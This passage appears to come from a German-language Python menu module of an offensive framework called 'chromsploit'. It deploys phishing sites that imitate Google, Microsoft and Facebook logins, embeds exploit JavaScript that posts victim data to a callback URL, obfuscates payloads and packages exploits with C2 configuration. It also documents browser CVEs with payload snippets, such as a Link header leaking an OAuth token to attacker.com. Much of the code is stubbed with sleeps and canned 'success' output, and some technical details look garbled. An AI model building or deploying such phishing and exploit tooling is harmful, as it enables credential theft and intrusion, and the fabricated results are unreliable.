        print(f"\n{Colors.CYAN}[*] Obfuskiere {exploit_name} mit Level {obfuscation}...{Colors.RESET}")
        
        # Hier würde die eigentliche Obfuskierung implementiert werden
        if extension == "ps1":
            print(f"{Colors.BLUE}[+] Wende PowerShell-Obfuskierung an...{Colors.RESET}")
            time.sleep(2)
        elif extension == "exe":
            print(f"{Colors.BLUE}[+] Wende OLLVM-Obfuskierung an...{Colors.RESET}")
            time.sleep(3)
        elif extension == "py":
            print(f"{Colors.BLUE}[+] Wende Python-Obfuskierung an...{Colors.RESET}")
            time.sleep(2)
        elif extension == "js" or extension == "html":
            print(f"{Colors.BLUE}[+] Wende JavaScript-Obfuskierung an...{Colors.RESET}")
            time.sleep(2)
        elif extension == "c":
            print(f"{Colors.BLUE}[+] Wende C/C++-Obfuskierung mit OLLVM an...{Colors.RESET}")
            time.sleep(3)
        
        print(f"{Colors.GREEN}[✓] Obfuskierung abgeschlossen{Colors.RESET}")
        print(f"\n{Colors.BRIGHT_WHITE}Obfuskierungsergebnis:{Colors.RESET}")
        print(f"  {Colors.GREEN}Eingabedatei:{Colors.RESET} {input_file}")
        print(f"  {Colors.GREEN}Ausgabedatei:{Colors.RESET} {output_file}")
        print(f"  {Colors.GREEN}Obfuskierungslevel:{Colors.RESET} {obfuscation}")
        
        # Beispielhafte Größenänderung
        original_size = os.path.getsize(input_file)
        obfuscated_size = original_size * (1 + int(obfuscation) * 0.5)  # Beispielhafte Größenzunahme
        
        print(f"  {Colors.GREEN}Originalgröße:{Colors.RESET} {Utils.format_bytes(original_size)}")
        print(f"  {Colors.GREEN}Obfuskierte Größe:{Colors.RESET} {Utils.format_bytes(obfuscated_size)}")
        
        input(f"\n{Colors.GREEN}Drücken Sie Enter, um fortzufahren...{Colors.RESET}")
    
    def _deploy_phishing(self) -> None:
        """
        Deploy phishing website with embedded exploit
        """
        self._clear()
        self._draw_box(80, f"PHISHING-WEBSITE BEREITSTELLEN - {self.cve_id.upper()}")
        
        print(f"\n{Colors.BRIGHT_WHITE}Phishing-Website mit Exploit-Integration{Colors.RESET}\n")
        
        # Template selection
        print(f"{Colors.BRIGHT_BLUE}Wählen Sie ein Phishing-Template:{Colors.RESET}")
        templates = {
            "1": ("Google Login", "google"),
            "2": ("Microsoft Login", "microsoft"),
            "3": ("Facebook Login", "facebook"),
            "4": ("Generic Portal", "generic"),
            "5": ("Document Viewer", "document")
        }
        
        for key, (name, _) in templates.items():
            print(f"  {key}) {name}")
        
        choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie das Template [1]: {Colors.RESET}")
        template_name, template_key = templates.get(choice, templates["1"])
        
        # Port configuration
        port = input(f"\n{Colors.BRIGHT_CYAN}Port für Phishing-Server [8080]: {Colors.RESET}")
        port = int(port) if port else 8080
        
        # Get callback URL
        use_ngrok = input(f"\n{Colors.BRIGHT_CYAN}Ngrok für externe Erreichbarkeit verwenden? [J/n]: {Colors.RESET}")
        use_ngrok = use_ngrok.lower() not in ['n', 'nein', 'no']
        
        if use_ngrok:
            callback_url = self._get_ngrok_url()
        else:
            callback_url = f"http://{Utils.get_ip_address()}:{port}"
        
        print(f"\n{Colors.CYAN}[*] Generiere Phishing-Website...{Colors.RESET}")
        
        try:
            # Import phishing generator
            from modules.phishing_generator import get_phishing_generator
            phishing_gen = get_phishing_generator()
            
            # Load exploit payload
            exploit_params = {
                'kali_ip': Utils.get_ip_address(),
                'port': port,
                'callback_url': callback_url,
                'target_url': 'http://target.local'
            }
            
            # Get exploit JavaScript
            exploit_result = self._execute_cve_exploit(exploit_params)
            
            if exploit_result.get('success'):
                # Default exploit JavaScript if not provided
                exploit_js = exploit_result.get('javascript_payload', f"""
                function runExploit() {{
                    console.log('[{self.cve_id.upper()}] Exploit triggered');
                    // Exploit code would be injected here
                    fetch('{callback_url}/exploit-trigger', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{
                            exploit: '{self.cve_id}',
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent
                        }})
                    }});
                }}
                """)
            else:
                exploit_js = "console.log('Exploit payload not available');"
            
            # Deploy phishing site
            result = phishing_gen.deploy_phishing_site(
                template=template_key,
                exploit_payload=exploit_js,
                callback_url=callback_url,
                port=port
            )
            
            if result['success']:
                print(f"{Colors.GREEN}[✓] Phishing-Website erfolgreich generiert!{Colors.RESET}")
                print(f"\n{Colors.BRIGHT_WHITE}Bereitstellungsinformationen:{Colors.RESET}")
                print(f"  {Colors.GREEN}Datei:{Colors.RESET} {result['filepath']}")
                print(f"  {Colors.GREEN}URL:{Colors.RESET} {result['url']}")
                print(f"  {Colors.GREEN}Server-Skript:{Colors.RESET} {result['server_script']}")
                
                if use_ngrok:
                    print(f"  {Colors.GREEN}Externe URL:{Colors.RESET} {callback_url}")
                
                print(f"\n{Colors.BRIGHT_YELLOW}Anweisungen:{Colors.RESET}")
                for instruction in result['instructions']:
                    print(f"  {Colors.YELLOW}• {instruction}{Colors.RESET}")
                
                # Option to start server immediately
                start_now = input(f"\n{Colors.BRIGHT_CYAN}Server jetzt starten? [J/n]: {Colors.RESET}")
                if start_now.lower() not in ['n', 'nein', 'no']:
                    print(f"\n{Colors.CYAN}[*] Starte Phishing-Server auf Port {port}...{Colors.RESET}")
                    print(f"{Colors.YELLOW}[!] Drücken Sie Ctrl+C zum Beenden{Colors.RESET}")
                    subprocess.Popen([sys.executable, result['server_script']])
                    time.sleep(2)
                    print(f"\n{Colors.GREEN}[✓] Server läuft: {result['url']}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[!] Fehler beim Generieren der Phishing-Website: {result.get('error')}{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[!] Fehler: {str(e)}{Colors.RESET}")
        
        input(f"\n{Colors.GREEN}Drücken Sie Enter, um fortzufahren...{Colors.RESET}")
    
    def _test_exploit(self) -> None:
        """
        Testet den Exploit in einer Simulationsumgebung
        """
        self._clear()
        self._draw_box(80, f"EXPLOIT TESTEN - {self.cve_id.upper()}")
        
        print(f"\n{Colors.BRIGHT_WHITE}Exploit-Simulation für {self.cve_id.upper()}{Colors.RESET}\n")
        print(f"{Colors.YELLOW}[!] Hinweis: Dies ist eine Simulation und führt keinen echten Exploit aus.{Colors.RESET}")
        
        print(f"\n{Colors.CYAN}[*] Initialisiere Testumgebung...{Colors.RESET}")
        time.sleep(1)
        
        # Ziel-Browser
        print(f"\n{Colors.BRIGHT_BLUE}Ziel-Browser für den Test:{Colors.RESET}")
        browsers = {
            "1": "Chrome",
            "2": "Firefox",
            "3": "Edge",
            "4": "Safari"
        }
        for key, browser in browsers.items():
            print(f"  {key}) {browser}")
        
        browser_choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie den Ziel-Browser [1]: {Colors.RESET}")
        browser = browsers.get(browser_choice, browsers["1"])
        
        # Ziel-Betriebssystem
        print(f"\n{Colors.BRIGHT_BLUE}Ziel-Betriebssystem für den Test:{Colors.RESET}")
        os_choices = {
            "1": "Windows 10/11",
            "2": "Linux",
            "3": "macOS"
        }
        for key, os_name in os_choices.items():
            print(f"  {key}) {os_name}")
        
        os_choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie das Ziel-Betriebssystem [1]: {Colors.RESET}")
        target_os = os_choices.get(os_choice, os_choices["1"])
        
        print(f"\n{Colors.CYAN}[*] Starte Exploit-Simulation gegen {browser} auf {target_os}...{Colors.RESET}")
        
        # Simulationsschritte
        steps = [
            ("Testumgebung vorbereiten", 2),
            (f"{browser}-Instanz starten", 1),
            ("Exploit ausführen", 3),
            ("Ergebnisse analysieren", 2)
        ]
        
        for step, duration in steps:
            print(f"{Colors.BLUE}[+] {step}...{Colors.RESET}")
            time.sleep(duration)
            print(f"{Colors.GREEN}[✓] {step} abgeschlossen{Colors.RESET}")
        
        # Simulationsergebnis
        print(f"\n{Colors.BRIGHT_GREEN}[✓] Exploit-Simulation erfolgreich abgeschlossen!{Colors.RESET}")
        
        # CVE-spezifische Ergebnisse
        if self.cve_id == "cve_2025_4664":
            print(f"\n{Colors.BRIGHT_WHITE}Simulationsergebnisse für Chrome Data Leak:{Colors.RESET}")
            print(f"  {Colors.GREEN}Link-Header-Manipulation:{Colors.RESET} Erfolgreich")
            print(f"  {Colors.GREEN}Referrer-Policy-Bypass:{Colors.RESET} Erfolgreich")
            print(f"  {Colors.GREEN}Datenexfiltration:{Colors.RESET} 3 URLs exfiltriert")
            print(f"  {Colors.GREEN}WebSocket-Verbindung:{Colors.RESET} Erfolgreich")
        
        elif self.cve_id == "cve_2025_2783":
            print(f"\n{Colors.BRIGHT_WHITE}Simulationsergebnisse für Chrome Mojo Sandbox Escape:{Colors.RESET}")
            print(f"  {Colors.GREEN}Mojo IPC Message Fuzzing:{Colors.RESET} Erfolgreich")
            print(f"  {Colors.GREEN}NodeController-Manipulation:{Colors.RESET} Erfolgreich")
            print(f"  {Colors.GREEN}Handle Validation Bypass:{Colors.RESET} Erfolgreich")
            print(f"  {Colors.GREEN}Sandbox Escape:{Colors.RESET} Erfolgreich")
            print(f"  {Colors.GREEN}Command Execution:{Colors.RESET} Erfolgreich (calc.exe gestartet)")
        
        elif self.cve_id == "cve_2025_2857":
            print(f"\n{Colors.BRIGHT_WHITE}Simulationsergebnisse für Firefox Sandbox Escape:{Colors.RESET}")
            print(f"  {Colors.GREEN}IPDL Handle Confusion:{Colors.RESET} Erfolgreich")
            print(f"  {Colors.GREEN}DuplicateHandle() Abuse:{Colors.RESET} Erfolgreich")
            print(f"  {Colors.GREEN}PROCESS_ALL_ACCESS:{Colors.RESET} Erfolgreich")
            print(f"  {Colors.GREEN}Privilege Escalation:{Colors.RESET} Erfolgreich")
            print(f"  {Colors.GREEN}Command Execution:{Colors.RESET} Erfolgreich (cmd.exe gestartet)")
        
        elif self.cve_id == "cve_2025_30397":
            print(f"\n{Colors.BRIGHT_WHITE}Simulationsergebnisse für Edge WebAssembly JIT Escape:{Colors.RESET}")
            print(f"  {Colors.GREEN}TurboFan Compiler Bypass:{Colors.RESET} Erfolgreich")
            print(f"  {Colors.GREEN}WebAssembly.Table Growth:{Colors.RESET} Erfolgreich")
            print(f"  {Colors.GREEN}ArrayBuffer OOB:{Colors.RESET} Erfolgreich")
            print(f"  {Colors.GREEN}V8 Heap Corruption:{Colors.RESET} Erfolgreich")
            print(f"  {Colors.GREEN}ROP Chain Execution:{Colors.RESET} Erfolgreich")
            print(f"  {Colors.GREEN}Command Execution:{Colors.RESET} Erfolgreich (powershell.exe gestartet)")
        
        input(f"\n{Colors.GREEN}Drücken Sie Enter, um fortzufahren...{Colors.RESET}")
    
    def _export_package(self) -> None:
        """
        Exportiert ein Exploit-Paket
        """
        self._clear()
        self._draw_box(80, f"EXPLOIT-PAKET EXPORTIEREN - {self.cve_id.upper()}")
        
        print(f"\n{Colors.BRIGHT_WHITE}Exportieren Sie den Exploit als vollständiges Paket{Colors.RESET}\n")
        
        # Paketname
        package_name = input(f"{Colors.BRIGHT_CYAN}Paketname [chromsploit_{self.cve_id}_package]: {Colors.RESET}")
        if not package_name:
            package_name = f"chromsploit_{self.cve_id}_package"
        
        # Paketbeschreibung
        package_description = input(f"{Colors.BRIGHT_CYAN}Paketbeschreibung: {Colors.RESET}")
        
        # Exportformat
        print(f"\n{Colors.BRIGHT_BLUE}Exportformat:{Colors.RESET}")
        export_formats = {
            "1": "ZIP-Archiv",
            "2": "TAR-Archiv",
            "3": "Ausführbares Installer-Script",
            "4": "Docker-Container"
        }
        for key, format_name in export_formats.items():
            print(f"  {key}) {format_name}")
        
        format_choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie das Exportformat [1]: {Colors.RESET}")
        export_format = export_formats.get(format_choice, export_formats["1"])
        
        # Zu exportierende Komponenten
        print(f"\n{Colors.BRIGHT_BLUE}Zu exportierende Komponenten:{Colors.RESET}")
        components = {
            "1": "Exploit-Code",
            "2": "Payloads",
            "3": "C2-Konfiguration",
            "4": "Dokumentation",
            "5": "Alle Komponenten"
        }
        for key, component in components.items():
            print(f"  {key}) {component}")
        
        component_choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie die zu exportierenden Komponenten [5]: {Colors.RESET}")
        selected_components = components.get(component_choice, components["5"])
        
        # Ausgabepfad
        output_dir = os.path.join(PathUtils.get_output_dir(), self.cve_id)
        PathUtils.ensure_dir_exists(output_dir)
        
        if format_choice == "1":
            output_file = os.path.join(output_dir, f"{package_name}.zip")
            format_extension = "zip"
        elif format_choice == "2":
            output_file = os.path.join(output_dir, f"{package_name}.tar.gz")
            format_extension = "tar.gz"
        elif format_choice == "3":
            output_file = os.path.join(output_dir, f"{package_name}.sh")
            format_extension = "sh"
        elif format_choice == "4":
            output_file = os.path.join(output_dir, f"{package_name}.tar")
            format_extension = "tar"
        
        print(f"\n{Colors.CYAN}[*] Erstelle Exploit-Paket...{Colors.RESET}")
        
        # Hier würde die eigentliche Paketierung implementiert werden
        steps = [
            ("Komponenten sammeln", 1),
            ("Metadaten erstellen", 1),
            ("Dokumentation generieren", 2),
            (f"{export_format} erstellen", 2)
        ]
        
        for step, duration in steps:
            print(f"{Colors.BLUE}[+] {step}...{Colors.RESET}")
            time.sleep(duration)
            print(f"{Colors.GREEN}[✓] {step} abgeschlossen{Colors.RESET}")
        
        print(f"\n{Colors.BRIGHT_GREEN}[✓] Exploit-Paket erfolgreich erstellt!{Colors.RESET}")
        print(f"\n{Colors.BRIGHT_WHITE}Paketinformationen:{Colors.RESET}")
        print(f"  {Colors.GREEN}Name:{Colors.RESET} {package_name}")
        print(f"  {Colors.GREEN}Format:{Colors.RESET} {export_format}")
        print(f"  {Colors.GREEN}Komponenten:{Colors.RESET} {selected_components}")
        print(f"  {Colors.GREEN}Ausgabedatei:{Colors.RESET} {output_file}")
        
        # Beispielhafte Größe
        package_size = 1024 * 1024 * (2 + int(format_choice))  # Beispielhafte Größe
        print(f"  {Colors.GREEN}Größe:{Colors.RESET} {Utils.format_bytes(package_size)}")
        
        input(f"\n{Colors.GREEN}Drücken Sie Enter, um fortzufahren...{Colors.RESET}")
    
    def _show_documentation(self) -> None:
        """
        Zeigt die Dokumentation für den Exploit an
        """
        self._clear()
        self._draw_box(80, f"EXPLOIT-DOKUMENTATION - {self.cve_id.upper()}")
        
        # CVE-spezifische Dokumentation
        if self.cve_id == "cve_2025_4664":
            documentation = """
Chrome Data Leak (CVE-2025-4664)
================================

Beschreibung:
------------
Diese Schwachstelle betrifft den Link-Header-Parser in Chrome und ermöglicht es einem Angreifer, 
Cross-Origin-Daten über den Referer-Header zu exfiltrieren. Die Schwachstelle liegt in der 
fehlerhaften Implementierung der referrerpolicy-Direktive in Link-Headern.

Technische Details:
-----------------
Die Schwachstelle befindet sich in der Datei components/link_header_parser/link_header_parser.cc, 
wo die referrerpolicy-Direktive nicht korrekt validiert wird. Wenn ein Link-Header mit 
referrerpolicy=unsafe-url gesendet wird, wird diese Policy unabhängig von der Dokumentrichtlinie 
angewendet, was zur Offenlegung sensibler URLs führen kann.

Exploit-Mechanismus:
------------------
1. Der Angreifer sendet eine HTML-Seite mit einem <img>-Tag, das auf eine Ressource des Angreifers verweist
2. Der Server antwortet mit einem Link-Header, der auf eine sensible URL verweist und referrerpolicy=unsafe-url enthält
3. Chrome führt eine Preconnect-Anfrage durch und sendet dabei die vollständige URL als Referer
4. Der Angreifer kann die sensiblen Daten aus dem Referer-Header extrahieren

Payload-Beispiel:
---------------
```html
<!DOCTYPE html>
<html>
<head>
    <title>CVE-2025-4664 Exploit</title>
</head>
<body>
    <img src="https://attacker.com/pixel.png">
</body>
</html>
```

Server-Antwort:
```
HTTP/1.1 200 OK
Content-Type: image/png
Link: <https://victim.com/oauth?token=SECRET>; rel=preconnect; referrerpolicy=unsafe-url
```

Betroffene Versionen:
-------------------
- Chrome < 135.0.7103.112
- Chromium-basierte Browser mit ähnlichen Versionen

Gegenmaßnahmen:
-------------
- Aktualisieren Sie Chrome auf Version 135.0.7103.112 oder höher
- Verwenden Sie eine Content-Security-Policy mit referrer-Direktiven
- Implementieren Sie CSRF-Tokens für sensible Operationen
"""
        
        elif self.cve_id == "cve_2025_2783":
            documentation = """
Chrome Mojo Sandbox Escape (CVE-2025-2783)
=========================================

Beschreibung:
------------
Diese Schwachstelle betrifft das Mojo IPC-System in Chrome und ermöglicht es einem Angreifer, 
aus der Sandbox auszubrechen und Befehle mit erhöhten Rechten auszuführen. Die Schwachstelle 
liegt in der fehlerhaften Validierung von Mojo-Nachrichten im NodeController.

Technische Details:
-----------------
Die Schwachstelle befindet sich in der Implementierung des NodeController in Chrome, der für die 
Verwaltung von Mojo-Verbindungen zwischen Prozessen zuständig ist. Durch das Senden einer speziell 
gestalteten Mojo-Nachricht mit einem ungültigen Header-Typ (0xBADCOFFEE) kann ein Angreifer eine 
Typverwirrung auslösen, die zur Umgehung der Handle-Validierung führt.

Exploit-Mechanismus:
------------------
1. Der Angreifer kompromittiert zunächst den Renderer-Prozess (z.B. durch eine separate RCE-Schwachstelle)
2. Der Angreifer sendet eine manipulierte Mojo-Nachricht an den NodeController
3. Die Nachricht enthält einen ungültigen Header-Typ, der die Validierung umgeht
4. Der NodeController verarbeitet die Nachricht in einem privilegierten Kontext
5. Der Angreifer kann Handles duplizieren und auf privilegierte Ressourcen zugreifen
6. Post-Exploitation-Befehle können mit erhöhten Rechten ausgeführt werden

Payload-Beispiel:
---------------
```cpp
// Exploit-Code-Snippet
mojo::Message message;
message.set_interface_name("mojo::core::NodeController");
message.set_header({
  .version = 0x41, 
  .type = 0xBADCOFFEE,  // Ungültiger Nachrichtentyp
  .flags = MOJO_MESSAGE_FLAG_HAS_CONTEXT
});
```

Betroffene Versionen:
-------------------
- Chrome < 135.0.7103.112
- Chromium-basierte Browser mit ähnlichen Versionen

Gegenmaßnahmen:
-------------
- Aktualisieren Sie Chrome auf Version 135.0.7103.112 oder höher
- Aktivieren Sie Site Isolation und andere Sicherheitsfeatures in Chrome
- Verwenden Sie einen Virenscanner mit Browser-Exploit-Erkennung
"""
        
        elif self.cve_id == "cve_2025_2857":
            documentation = """
Firefox Sandbox Escape (CVE-2025-2857)
=====================================

Beschreibung:
------------
Diese Schwachstelle betrifft das IPDL-System (Inter-Process Communication Protocol Definition Language) 
in Firefox und ermöglicht es einem Angreifer, aus der Sandbox auszubrechen und Prozesse mit 
PROCESS_ALL_ACCESS-Rechten zu manipulieren. Die Schwachstelle liegt in der fehlerhaften Validierung 
von Prozess-Handles.

Technische Details:
-----------------
Die Schwachstelle befindet sich in der Implementierung des IPDL-Systems in Firefox, das für die 
Kommunikation zwischen Prozessen zuständig ist. Wenn ein kompromittierter Content-Prozess sein 
eigenes Handle über DuplicateHandle() sendet, interpretiert der übergeordnete Prozess es fälschlicherweise 
als einen eingeschränkten Handle-Typ, was zur Umgehung der Sicherheitsvalidierung führt.

Exploit-Mechanismus:
------------------
1. Der Angreifer kompromittiert zunächst den Content-Prozess (z.B. durch eine separate RCE-Schwachstelle)
2. Der Angreifer sendet das eigene Prozess-Handle über den IPDL-Kanal
3. Der übergeordnete Prozess interpretiert das Handle falsch und gewährt PROCESS_ALL_ACCESS-Rechte
4. Der Angreifer kann nun auf privilegierte Ressourcen zugreifen und Befehle mit erhöhten Rechten ausführen

Payload-Beispiel:
---------------
```rust
// Exploit-Code-Snippet
let malicious_handle = unsafe { GetCurrentProcess() };
ipc_channel.send(malicious_handle);

// Fehlerhafte Validierung im übergeordneten Prozess
fn on_ipc_message(handle: RawHandle) {
  // Fehlende SEHOP-Validierung
  let target_process = OpenProcess(PROCESS_ALL_ACCESS, handle);
}
```

Betroffene Versionen:
-------------------
- Firefox < 135.0.3
- Firefox ESR < 128.15.0

Gegenmaßnahmen:
-------------
- Aktualisieren Sie Firefox auf Version 135.0.3 oder höher
- Aktivieren Sie die Content-Sandbox und andere Sicherheitsfeatures in Firefox
- Verwenden Sie einen Virenscanner mit Browser-Exploit-Erkennung
"""
        
        elif self.cve_id == "cve_2025_30397":
            documentation = """
Edge WebAssembly JIT Escape (CVE-2025-30397)
==========================================

Beschreibung:
------------
Diese Schwachstelle betrifft den WebAssembly-JIT-Compiler in Microsoft Edge und ermöglicht es einem 
Angreifer, Bounds-Checks zu umgehen und Heap-Corruption zu verursachen. Die Schwachstelle liegt in 
der fehlerhaften Optimierung von WebAssembly-Code durch den TurboFan-Compiler.

Technische Details:
-----------------
Die Schwachstelle befindet sich im TurboFan-Compiler von V8, der in Microsoft Edge verwendet wird. 
Bei der Optimierung von WebAssembly-Code werden Bounds-Checks für ArrayBuffer-Zugriffe fälschlicherweise 
entfernt, wenn WebAssembly.Table-Wachstumsoperationen verwendet werden. Dies ermöglicht Out-of-Bounds-Zugriffe 
auf angrenzende V8-Heap-Strukturen.

Exploit-Mechanismus:
------------------
1. Der Angreifer erstellt ein WebAssembly-Modul mit einer Funktion, die eine WebAssembly.Table wachsen lässt
2. Der TurboFan-Compiler optimiert den Code und entfernt fälschlicherweise Bounds-Checks
3. Der Angreifer kann Out-of-Bounds-Zugriffe auf den V8-Heap durchführen
4. Durch Manipulation von WasmInstanceObject kann beliebiger RWX-Speicher alloziert werden
5. Ein ROP-Chain kann erstellt werden, um SMEP/SMAP zu umgehen und Code mit erhöhten Rechten auszuführen

Payload-Beispiel:
---------------
```wat
(module
  (func $grow (param $delta i32)
    (call $grow_table (i32.const 0) (local.get $delta))
  )
)
```

Betroffene Versionen:
-------------------
- Microsoft Edge < 135.0.1118.62
- Chromium-basierte Browser mit ähnlichen V8-Versionen

Gegenmaßnahmen:
-------------
- Aktualisieren Sie Microsoft Edge auf Version 135.0.1118.62 oder höher
- Aktivieren Sie Site Isolation und andere Sicherheitsfeatures in Edge
- Deaktivieren Sie WebAssembly in Unternehmensumgebungen, wenn möglich
- Verwenden Sie einen Virenscanner mit Browser-Exploit-Erkennung
"""
        
        else:
            documentation = f"Keine Dokumentation für {self.cve_id.upper()} verfügbar."
        
        print(documentation)
        
        input(f"\n{Colors.GREEN}Drücken Sie Enter, um fortzufahren...{Colors.RESET}")
